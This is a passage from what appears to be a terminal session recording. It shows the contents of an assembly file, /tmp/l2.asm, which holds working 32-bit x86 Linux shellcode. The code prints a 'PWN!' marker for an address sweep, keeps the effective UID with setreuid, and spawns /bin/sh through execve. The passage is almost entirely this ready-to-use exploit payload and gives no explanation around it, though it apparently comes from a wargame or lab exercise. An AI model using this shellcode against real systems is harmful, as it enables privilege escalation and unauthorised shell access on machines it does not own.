[13.581, "o", "$ cat /tmp/l2.asm\r\nBITS 32\r\r\n\u001b[?2004l\r\u001b[?2004h> global _start\r\r\n\u001b[?2004l\r\u001b[?2004h> _start:\r\r\n\u001b[?2004l\r\u001b[?2004h>     ; write(1, \"PWN!\", 4) -- marker so the address sweep can detect a hit\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     push eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     push 0x214e5750\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov ecx, esp\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor ebx, ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     inc ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor edx, edx\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov dl, 4\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov al, 4\r\r\n\u001b[?2004l\r\u001b[?2004h>     int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     ; euid = geteuid(); setreuid(euid, euid) -- keep euid over execve\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov al, 201\r\r\n\u001b[?2004l\r\u001b[?2004h>     int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov ebx, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov ecx, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov al, 70\r\r\n\u001b[?2004l\r\u001b[?2004h>     int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     push eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     push 0x68732f2f\r\r\n\u001b[?2004l\r\u001b[?2004h>     push 0x6e69622f\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov ebx, esp\r\r\n\u001b[?2004l\r\u001b[?2004h>     push eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     push ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov ecx, esp\r\r\n\u001b[?2004l\r\u001b[?2004h>     xor edx, edx\r\r\n\u001b[?2004l\r\u001b[?2004h>     mov al, 11\r\r\n\u001b[?2004l\r\u001b[?2004h>     int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h> EOF\